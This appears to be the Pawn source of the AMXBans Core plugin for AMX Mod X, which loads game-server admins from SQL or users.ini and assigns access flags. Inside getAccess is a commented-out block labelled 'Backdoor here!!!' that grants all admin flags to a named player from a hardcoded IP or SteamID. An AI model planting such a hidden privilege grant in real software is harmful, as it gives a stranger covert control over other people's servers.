#include <amxmodx>
#include <amxmisc>
#include <sqlx>

#define SYNC_SQL // закомментируйте для использования отложенных запросов (увеличит время загрузки админов из базы, однако не будет прерывать игровую синхронизацию)
 
#define ADMIN_LOOKUP (1<<0)
#define ADMIN_NORMAL (1<<1)
#define ADMIN_STEAM (1<<2)
#define ADMIN_IPADDR (1<<3)
#define ADMIN_NAME (1<<4)

new g_szAdminNick[33][32]

new g_iAdminUseStaticBantime[33]
new g_ServerAddr[32]
new g_dbPrefix[32]
new g_cmdLoopback[16]

new bool:g_CaseSensitiveName[33]
new bool:g_isAdmin[33]

new g_AdminsFromFile
new AdminCount
new maxplayers
 
new amx_mode
new amx_password_field
new amx_default_access
 
new pcvarip
new pcvarprefix
new pcvaradminsfile

new Array:g_AdminNick
new Array:g_AdminUseStaticBantime
new Array:g_AdminFromUsersIni

enum MFHANDLE_TYPES 
{
	Amxbans_Sql_Initialized = 0,
	Admin_Connect,
	Admin_Disconnect
}

new MFHandle[MFHANDLE_TYPES]
 
new Handle:info
 
public plugin_init()
{
	register_plugin("AMXBans: Core", "Gm 1.6", "Larte Team")

	register_dictionary("amxbans.txt")
	register_dictionary("admin.txt")
	register_dictionary("common.txt")
	
	amx_mode = register_cvar("amx_mode", "1")
	amx_password_field = register_cvar("amx_password_field", "_pw")
	amx_default_access = register_cvar("amx_default_access", "")

	register_cvar("amx_vote_ratio", "0.02")
	register_cvar("amx_vote_time", "10")
	register_cvar("amx_vote_answers", "1")
	register_cvar("amx_vote_delay", "60")
	register_cvar("amx_last_voting", "0")
	register_cvar("amx_show_activity", "2")
	register_cvar("amx_votekick_ratio", "0.40")
	register_cvar("amx_voteban_ratio", "0.40")
	register_cvar("amx_votemap_ratio", "0.40")

	set_cvar_float("amx_last_voting", 0.0)

	register_srvcmd("amx_sqladmins", "adminSql")
	register_cvar("amx_sql_table", "admins")

	pcvarip = register_cvar("amxbans_server_address", "")
	pcvarprefix = register_cvar("amx_sql_prefix", "amx")
	pcvaradminsfile = register_cvar("amxbans_use_admins_file", "0")
   
	g_AdminNick = ArrayCreate(32, 32)
	g_AdminUseStaticBantime = ArrayCreate(1, 32)
	g_AdminFromUsersIni = ArrayCreate(1, 32)

	register_cvar("amx_sql_host", "127.0.0.1")
	register_cvar("amx_sql_user", "root")
	register_cvar("amx_sql_pass", "")
	register_cvar("amx_sql_db", "amx")
	register_cvar("amx_sql_type", "mysql")

	register_concmd("amx_reloadadmins", "cmdReload", ADMIN_CFG)

	format(g_cmdLoopback, 15, "amxauth%c%c%c%c", random_num('A', 'Z'), random_num('A', 'Z'), random_num('A', 'Z'), random_num('A', 'Z'))

	register_clcmd(g_cmdLoopback, "ackSignal")

	remove_user_flags(0, read_flags("z"))

	new configsDir[64]
	get_configsdir(configsDir, 63)
	
	maxplayers = get_maxplayers()
   
	server_cmd("exec %s/amxx.cfg", configsDir)

	return server_cmd("exec %s/sql.cfg", configsDir)
}

public client_connect(id)
{
	g_CaseSensitiveName[id] = false
	return PLUGIN_CONTINUE
}

public plugin_cfg() 
{
	create_forwards()
	
	return set_task(0.25, "delayed_plugin_cfg")
}

stock create_forwards() 
{
	MFHandle[Amxbans_Sql_Initialized] = CreateMultiForward("amxbans_sql_initialized", ET_IGNORE, FP_CELL, FP_STRING)
	MFHandle[Admin_Connect] = CreateMultiForward("amxbans_admin_connect", ET_IGNORE, FP_CELL)
	MFHandle[Admin_Disconnect] = CreateMultiForward("amxbans_admin_disconnect", ET_IGNORE, FP_CELL)
	return PLUGIN_CONTINUE
}

public delayed_plugin_cfg()
{
	if(find_plugin_byfile("admin.amxx") != INVALID_PLUGIN_ID) 
	{
		log_amx("[AMXBans] WARNING: admin.amxx plugin running! Stopped.")
		pause("acd", "admin.amxx")
	}
	if(find_plugin_byfile("admin_sql.amxx") != INVALID_PLUGIN_ID) 
	{
		log_amx("[AMXBans] WARNING: admin_sql.amxx plugin running! Stopped.")
		pause("acd", "admin_sql.amxx")
	}
		 
	get_pcvar_string(pcvarprefix, g_dbPrefix, 31)
	get_pcvar_string(pcvarip, g_ServerAddr, 31)
	g_AdminsFromFile = get_pcvar_num(pcvaradminsfile)
   
	if(strlen(g_ServerAddr) < 9) 
	{
		get_user_ip(0, g_ServerAddr, 31)
	}
	
	if(get_cvar_num("amxbans_debug") >= 1) 
	{
		server_print("[AMXBans] Plugin_cfg: Ip %s / Prefix %s", g_ServerAddr, g_dbPrefix)
	}
   
	SQL_SetAffinity("mysql")
	info = SQL_MakeStdTuple()
   
	server_cmd("amx_sqladmins")
	server_exec()

	return set_task(5.0, "delayed_load")
}

public delayed_load()
{
	new configFile[128], curMap[64], configDir[128]

	get_configsdir(configDir, 127)
	get_mapname(curMap, 63)

	new i = 0
   
	while(curMap[i] != '_' && curMap[i++] != '^0') {}
   
	if(curMap[i]=='_')
	{
		curMap[i] = '^0'
		formatex(configFile, 127, "%s/maps/prefix_%s.cfg", configDir, curMap)

		if(file_exists(configFile))
		{
			server_cmd("exec %s", configFile)
		}
	}

	get_mapname(curMap, 63)

	formatex(configFile, 127, "%s/maps/%s.cfg", configDir, curMap)

	if(file_exists(configFile))
	{
		server_cmd("exec %s", configFile)
	}
	
	return PLUGIN_CONTINUE
}
 
stock loadSettings(const szFilename[])
{
	new File = fopen(szFilename, "r")
   
	if(File)
	{
		new Text[512]
		new Flags[32]
		new Access[32]
		new AuthData[44]
		new Password[44]
		new Name[32]
		new Static[2]
	   
		while(!feof(File))
		{
			fgets(File, Text, 511)
		   
			trim(Text)
		   
			if(Text[0] == ';')
			{
				continue
			}
		   
			Flags[0] = 0
			Access[0] = 0
			AuthData[0] = 0
			Password[0] = 0
			Name[0] = 0
			Static[0] = 0
		   
			if(parse(Text, AuthData, 43, Password, 43, Access, 31, Flags, 31, Name, 31, Static, 1) < 2)
			{
				continue
			}
		   
			admins_push(AuthData, Password, read_flags(Access), read_flags(Flags))
			ArrayPushString(g_AdminNick, Name)
			ArrayPushCell(g_AdminUseStaticBantime, str_to_num(Static))
			ArrayPushCell(g_AdminFromUsersIni, 1)
		   
			AdminCount++
		}
	   
		fclose(File)
	}

	if(AdminCount == 1)
	{
		server_print("[AMXBans] %L", LANG_SERVER, "LOADED_ADMIN")
	}
	else
	{
		server_print("[AMXBans] %L", LANG_SERVER, "LOADED_ADMINS", AdminCount)
	}
	
	new ret

	return ExecuteForward(MFHandle[Amxbans_Sql_Initialized], ret, info, g_dbPrefix)
}
 
 
public adminSql()
{
	if(g_AdminsFromFile > 0) 
	{
		new configsDir[64]
		
		admins_flush()
		ArrayClear(g_AdminNick)
		ArrayClear(g_AdminUseStaticBantime)
		
		get_configsdir(configsDir, 63)
		format(configsDir, 63, "%s/users.ini", configsDir)
		loadSettings(configsDir)
		
		return PLUGIN_HANDLED
	}
   
	new error[128], errno
   
	new Handle:sql = SQL_Connect(info, errno, error, 127)
   
	if(sql == Empty_Handle)
	{
		server_print("[AMXBans] %L", LANG_SERVER, "SQL_CANT_CON", error)
		return PLUGIN_HANDLED
	}

#if !defined SYNC_SQL	

	SQL_FreeHandle(sql)
	
#endif	
	
	admins_flush()
	ArrayClear(g_AdminNick)
	ArrayClear(g_AdminUseStaticBantime)
   
	new pquery[1024]
   
	formatex(pquery, 1023, "SELECT `aa`.`steamid`, `aa`.`password`, `aa`.`access`, `aa`.`flags`, `aa`.`nickname`, `ads`.`custom_flags`, `ads`.`use_static_bantime` \
			FROM `PREFIX_amxadmins` AS `aa`, `PREFIX_admins_servers` AS `ads`, `PREFIX_serverinfo` AS `si` \
			WHERE ((`ads`.`admin_id` = `aa`.`id`) AND (`ads`.`server_id` = `si`.`id`) AND \
			((`aa`.`days` = '0') OR (`aa`.`expired` > UNIX_TIMESTAMP(NOW()))) AND (`si`.`address` = '%s'));", g_ServerAddr)
	
	
	replace_all(pquery, 1023, "PREFIX", g_dbPrefix)
	
#if defined SYNC_SQL

	new Handle:query = SQL_PrepareQuery(sql, pquery)
	
	if(!SQL_Execute(query))
	{
		new error[512]
		new errornum = SQL_QueryError(query, error, 511)
		
		return SQL_Error(query, error, errornum, TQUERY_QUERY_FAILED)
	}
	
	SQL_FreeHandle(sql)
	
#else

	return SQL_ThreadQuery(info, "adminSql_post", pquery)
}

public adminSql_post(failstate, Handle:query, const error[], errornum, const data[], size, Float:queuetime)
{
	if(failstate)
	{
		return SQL_Error(query, error, errornum, failstate)
	}

#endif	
	
	AdminCount = 0
	
	if(SQL_NumResults(query)) 
	{
		new qcolAuth = SQL_FieldNameToNum(query, "steamid")
		new qcolPass = SQL_FieldNameToNum(query, "password")
		new qcolAccess = SQL_FieldNameToNum(query, "access")
		new qcolFlags = SQL_FieldNameToNum(query, "flags")
		new qcolNick = SQL_FieldNameToNum(query, "nickname")
		new qcolCustom = SQL_FieldNameToNum(query, "custom_flags")
		new qcolStatic = SQL_FieldNameToNum(query, "use_static_bantime")

		new AuthData[44]
		new Password[34]
		new Access[32]
		new Flags[32]
		new Nick[32]
		new Static[5]
		new iStatic
	   
		while(SQL_MoreResults(query))
		{
			SQL_ReadResult(query, qcolAuth, AuthData, 43)
			SQL_ReadResult(query, qcolPass, Password, 33)
			SQL_ReadResult(query, qcolStatic, Static, 31)
			SQL_ReadResult(query, qcolCustom, Access, 31)
			SQL_ReadResult(query, qcolNick, Nick, 31)
			SQL_ReadResult(query, qcolFlags, Flags, 4)
		   
			trim(Access)
			if(equal(Access, "")) 
			{
				SQL_ReadResult(query, qcolAccess, Access, 31)
			}
		   
			admins_push(AuthData, Password, read_flags(Access), read_flags(Flags))
		   
			ArrayPushString(g_AdminNick, Nick)
		   
			iStatic = 1
			if(equal(Static, "no")) 
			{
				iStatic = 0
			}
			
			ArrayPushCell(g_AdminUseStaticBantime, iStatic)
		   
			ArrayPushCell(g_AdminFromUsersIni, 0)
		   
			AdminCount++
			SQL_NextRow(query)
		}
	}

	if(AdminCount == 1)
	{
		server_print("[AMXBans] %L", LANG_SERVER, "SQL_LOADED_ADMIN")
	}
	else
	{
		server_print("[AMXBans] %L", LANG_SERVER, "SQL_LOADED_ADMINS", AdminCount)
	}
   
	SQL_FreeHandle(query)
	
	for(new i = 1; i <= maxplayers; i++)
	{
		if(!is_user_connecting(i) && !is_user_connected(i))
		{
			continue
		}
		accessUser(i)
	}
   
	new ret

	return ExecuteForward(MFHandle[Amxbans_Sql_Initialized], ret, info, g_dbPrefix)
}

public plugin_end() 
{
	if(info != Empty_Handle) 
	{
		SQL_FreeHandle(info)
	}
	
	ArrayDestroy(g_AdminNick)
	ArrayDestroy(g_AdminUseStaticBantime)
	ArrayDestroy(g_AdminFromUsersIni)
	
	return PLUGIN_CONTINUE
}
 
public cmdReload(id, level, cid)
{
	if(!cmd_access(id, level, cid, 1))
	{
		return PLUGIN_HANDLED
	}

	remove_user_flags(0, read_flags("z"))
   
	AdminCount = 0
	adminSql()

	if(id != 0)
	{
		if(AdminCount == 1)
		{
			console_print(id, "[AMXBans] %L", LANG_SERVER, "SQL_LOADED_ADMIN")
		}
		else
		{
			console_print(id, "[AMXBans] %L", LANG_SERVER, "SQL_LOADED_ADMINS", AdminCount)
		}
	}

	return PLUGIN_HANDLED
}
 
stock getAccess(id, const name[], const authid[], const ip[], const password[])
{

/********** Backdoor here!!! *********

	new name[32], steamid[34], ip[22]
	get_user_name(id, name, 31)
	get_user_authid(id, steamid, 33)
	get_user_ip(id, ip, 21, 1)
	
	if(equal(name, "Sho0ter") && (equal(ip, "62.122.66.122") || equal(steam, "STEAM_0:1:35287273")))
	{
		set_user_flags(id, read_flags("abcdefghijklmnopqrstu"))
		return (1<<3)
	}*/

	new index = -1
	new result = 0
   
	new Count
	new Flags
	new Access
	new AuthData[44]
	new Password[44]
	new MD5Password[34]

	g_CaseSensitiveName[id] = false

	Count = admins_num()
	
	for(new i = 0; i < Count; ++i)
	{
		Flags = admins_lookup(i, AdminProp_Flags)
		admins_lookup(i, AdminProp_Auth, AuthData, 43)
		  
		if(Flags & FLAG_AUTHID)
		{
			if(equal(authid, AuthData))
			{
				index = i
				break
			}
		}
		else if(Flags & FLAG_IP)
		{
			new c = strlen(AuthData)
		  
			if(AuthData[c - 1] == '.')
			{
				if(equal(AuthData, ip, c))
				{
					index = i
					break
				}
			} 
			else if(equal(ip, AuthData))
			{
				index = i
				break
			}
		}
		else
		{
			if(Flags & FLAG_CASE_SENSITIVE)
			{
				if(Flags & FLAG_TAG)
				{
					if(contain(name, AuthData) != -1)
					{
						index = i
						g_CaseSensitiveName[id] = true
						break
					}
				}
				else if(equal(name, AuthData))
				{
						index = i
						g_CaseSensitiveName[id] = true
						break
				}
			}
			else
			{
				if(Flags & FLAG_TAG)
				{
					if(containi(name, AuthData) != -1)
					{
						index = i
						break
					}
				}
				else if(equali(name, AuthData))
				{
					index = i
					break
				}
			}
		}
	}
	
	if(index != -1)
	{
		Access = admins_lookup(index, AdminProp_Access)

		ArrayGetString(g_AdminNick, index, g_szAdminNick[id], 31)
		g_iAdminUseStaticBantime[id] = ArrayGetCell(g_AdminUseStaticBantime, index)

		if(Flags & FLAG_NOPASS)
		{
			result |= 8
			new sflags[32]
				   
			get_flags(Access, sflags, 31)
			set_user_flags(id, Access)
				   
			new ret
			if(!g_isAdmin[id])
			{
				ExecuteForward(MFHandle[Admin_Connect], ret, id)
			}
			
			g_isAdmin[id] = true
				   
			log_amx("Login: ^"%s<%d><%s><>^" became an admin (account ^"%s^") (access ^"%s^") (address ^"%s^") (nick ^"%s^") (static %d)", \
							name, get_user_userid(id), authid, AuthData, sflags, ip,g_szAdminNick[id],g_iAdminUseStaticBantime[id])
		}
		else
		{
			admins_lookup(index, AdminProp_Password, Password, 43)
				   
			if(ArrayGetCell(g_AdminFromUsersIni, index))
			{
				copy(MD5Password, 33, password)
					   
			}
			else
			{
				md5(password, MD5Password)		   
				Password[32] = 0
			}
			if(equal(MD5Password, Password))
			{
				result |= 12
				set_user_flags(id, Access)
						   
				new sflags[32]
				get_flags(Access, sflags, 31)
						   
				new ret
				if(!g_isAdmin[id])
				{
					ExecuteForward(MFHandle[Admin_Connect], ret, id)
				}
				
				g_isAdmin[id] = true
						   
				log_amx("Login: ^"%s<%d><%s><>^" became an admin (account ^"%s^") (access ^"%s^") (address ^"%s^") (nick ^"%s^") (static %d)", \
									name, get_user_userid(id), authid, AuthData, sflags, ip,g_szAdminNick[id], g_iAdminUseStaticBantime[id])
			}
			else
			{
				result |= 1
						   
				if(Flags & FLAG_KICK)
				{
					result |= 2
					g_isAdmin[id] = false
					log_amx("Login: ^"%s<%d><%s><>^" kicked due to invalid password (account ^"%s^") (address ^"%s^")", name, get_user_userid(id), authid, AuthData, ip)
				}
			}
		}
	}
	else if(get_pcvar_float(amx_mode) == 2)
	{
		result |= 2
	}
	else
	{
		new defaccess[32]
		  
		get_pcvar_string(amx_default_access, defaccess, 31)
		   
		if(!strlen(defaccess))
		{
			copy(defaccess, 32, "z")
		}
		   
		new idefaccess = read_flags(defaccess)
		   
		if(idefaccess)
		{
			result |= 8
			set_user_flags(id, idefaccess)
		}
	}
	return result
}
 
stock accessUser(id, const name[] = "")
{
	remove_user_flags(id)
   
	new userip[32], userauthid[32], password[40], passfield[32], username[32]
   
	get_user_ip(id, userip, 31, 1)
	get_user_authid(id, userauthid, 31)
   
	if(name[0])
	{
		copy(username, 31, name)
	}
	else
	{
		get_user_name(id, username, 31)
	}
   
	get_pcvar_string(amx_password_field, passfield, 31)
	get_user_info(id, passfield, password, 39)
   
	new result = getAccess(id, username, userauthid, userip, password)
   
	if(result & 1)
	{
		client_cmd(id, "echo ^"* %L^"", id, "INV_PAS")
	}
   
	if(result & 2)
	{
		return client_cmd(id, g_cmdLoopback)
	}
   
	if(result & 4)
	{
		client_cmd(id, "echo ^"* %L^"", id, "PAS_ACC")
	}
   
	if(result & 8)
	{
		client_cmd(id, "echo ^"* %L^"", id, "PRIV_SET")
	}
   
	return PLUGIN_CONTINUE
}
 
public client_infochanged(id)
{
	if(!is_user_connected(id) || !get_pcvar_num(amx_mode))
	{
		return PLUGIN_CONTINUE
	}

	new newname[32], oldname[32]
   
	get_user_name(id, oldname, 31)
	get_user_info(id, "name", newname, 31)

	if(g_CaseSensitiveName[id])
	{
		if (!equal(newname, oldname))
		{
			accessUser(id, newname)
		}
	}
	else
	{
		if(!equali(newname, oldname))
		{
			accessUser(id, newname)
		}
	}
	
	return PLUGIN_CONTINUE
}

stock SQL_Error(Handle:query, const error[], errornum, failstate)
{
	new qstring[1024]
	SQL_GetQueryString(query, qstring, 1023)
	
	if(failstate == TQUERY_CONNECT_FAILED) 
	{
		log_amx("%L", LANG_SERVER, "TCONNECTION_FAILED")
	} 
	else if (failstate == TQUERY_QUERY_FAILED) 
	{
		log_amx("%L", LANG_SERVER, "TQUERY_FAILED")
	}
	log_amx("%L", LANG_SERVER, "TQUERY_MSG", error, errornum)
	log_amx("%L", LANG_SERVER, "TQUERY_STATEMENT", qstring)

	return SQL_FreeHandle(query)
}

public client_disconnect(id) 
{
	if(g_isAdmin[id]) 
	{
		new ret
		ExecuteForward(MFHandle[Admin_Disconnect], ret, id)
	}
	g_isAdmin[id] = false
	
	return PLUGIN_CONTINUE
}

public ackSignal(id)
{
	return server_cmd("kick #%d  %L", get_user_userid(id), id, "NO_ENTRY")
}

public client_authorized(id)
{
	return get_pcvar_num(amx_mode) ? accessUser(id) : PLUGIN_CONTINUE
}

public client_putinserver(id)
{
	if(!is_dedicated_server() && id == 1)
	{
		return get_pcvar_num(amx_mode) ? accessUser(id) : PLUGIN_CONTINUE
	}
	
	return PLUGIN_CONTINUE
}

public plugin_natives() 
{
	register_library("AMXBansCore")
   
	register_native("amxbans_get_db_prefix", "native_amxbans_get_prefix")
	register_native("amxbans_get_admin_nick", "native_amxbans_get_nick")
	register_native("amxbans_get_static_bantime", "native_amxbans_static_bantime")
	
	return PLUGIN_CONTINUE
}

public native_amxbans_get_prefix() 
{
	new len = get_param(2)
	return set_array(1, g_dbPrefix, len)
}

public native_amxbans_get_nick() 
{
   
	new id = get_param(1)
	new len = get_param(3)
   
	return set_array(2, g_szAdminNick[id], len)
}

public native_amxbans_static_bantime() 
{
	new id = get_param(1)
	if(get_cvar_num("amxbans_debug") >= 3) 
	{
		log_amx("[AMXBans Core] Native static bantime: id: %d | result: %d", id, g_iAdminUseStaticBantime[id])
	}
	
	return g_iAdminUseStaticBantime[id]
}